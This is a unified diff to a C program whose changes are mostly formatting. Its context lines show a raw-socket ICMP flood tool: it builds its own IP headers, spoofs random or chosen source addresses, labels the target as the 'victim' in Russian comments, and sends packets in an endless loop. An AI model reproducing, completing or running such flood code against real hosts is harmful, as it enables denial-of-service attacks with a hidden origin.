@@ -1,3 +1,5 @@
+#define _BSD_SOURCE
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -15,7 +17,7 @@ unsigned long resolve(char *hostname)
 {
   struct hostent *hp;
 
-  if ( (hp = gethostbyname(hostname)) == NULL) {
+  if ( ( hp = gethostbyname(hostname)) == NULL ) {
 
     herror("gethostbyname() failed");
     exit(-1);
@@ -72,7 +74,7 @@ int main(int argc, char *argv[])
   struct icmp *icmp_hdr = (struct icmp *) (sendbuf + sizeof(struct iphdr));
 
   if (argc != 3)
- {
+  {
     fprintf(stderr, 
     "Usage: %s <source address | random> <destination address>\n", 
     argv[0]);
@@ -86,8 +88,8 @@ int main(int argc, char *argv[])
     exit(-1);
   }
 
-  /* так как будем самостоятельно заполнять IP-заголовок,
-  то устанавливаем опцию IP_HDRINCL */
+  /* так как будем самостоятельно заполнять IP-заголовок, то устанавливаем опцию IP_HDRINCL */
+  
   if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)) < 0) {
     
     perror("setsockopt() failed");
@@ -104,10 +106,13 @@ int main(int argc, char *argv[])
   /* если в первом аргументе командной строки указано random,
   то IP-адрес источника выбирается случайным образом */
   if (!strcmp(argv[1], "random")) {
+
     rnd = 1;
     srcaddr = random();
-  } else 
-    srcaddr = resolve(argv[1]);
+  } 
+  else { 
+    srcaddr = resolve( argv[1] );
+  }
 
   /* IP-адрес жертвы */
   dstaddr = resolve( argv[2] );
@@ -143,13 +148,14 @@ int main(int argc, char *argv[])
   while ( 1 ) {
 
     if (sendto(sd, 
-               sendbuf, 
-	       sizeof(sendbuf),
-	       0, 
-	       (struct sockaddr *) &servaddr, 
-	       sizeof(servaddr)
-           )  < 0 
-           ) {
+              sendbuf, 
+	            sizeof(sendbuf),
+	            0, 
+	            (struct sockaddr *) &servaddr, 
+	            sizeof(servaddr)
+           ) < 0 
+        ) 
+    {
       perror("sendto() failed");
       exit(-1);
     }
